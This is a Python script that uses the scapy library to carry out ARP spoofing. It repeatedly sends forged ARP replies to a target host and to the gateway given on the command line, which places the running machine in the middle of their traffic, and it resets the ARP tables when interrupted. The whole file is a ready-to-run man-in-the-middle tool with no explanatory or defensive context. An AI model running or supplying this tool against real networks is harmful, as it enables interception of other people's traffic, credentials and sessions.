import scapy.all as scapy
import time
import optparse

def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list= scapy.srp(arp_request_broadcast,timeout = 1, verbose = False)[0]
    while str(answered_list) == "<Results: TCP:0 UDP:0 ICMP:0 Other:0>":
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
    scapy.send(packet, verbose = False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, count = 4, verbose = False)

def get_input():
    global target_ip, gateway_ip
    parser = optparse.OptionParser()

    parser.add_option("-t", "--target", dest = "targ", help = "Target ip address")
    parser.add_option("-g", "--gateway", dest = "gate", help = "Gateway ip address")

    (options, arguments) = parser.parse_args()

    target_ip = options.targ
    gateway_ip = options.gate

def input_error():
    print("\n[-]Values not entered. Try 'sudo python3 <program_name>.py --help' for more help and information.\n")

target_ip = ""
gateway_ip = ""
get_input()

try:
    packets_sent_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        packets_sent_count+=2
        print("\r[+] Sent "+str(packets_sent_count)+" packets", end="")
        time.sleep(2)

except IndexError:
    input_error()

except:
    print("\n[-] Detected Ctrl+C... Exitting program... Resetting ARP tables... Please wait...")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
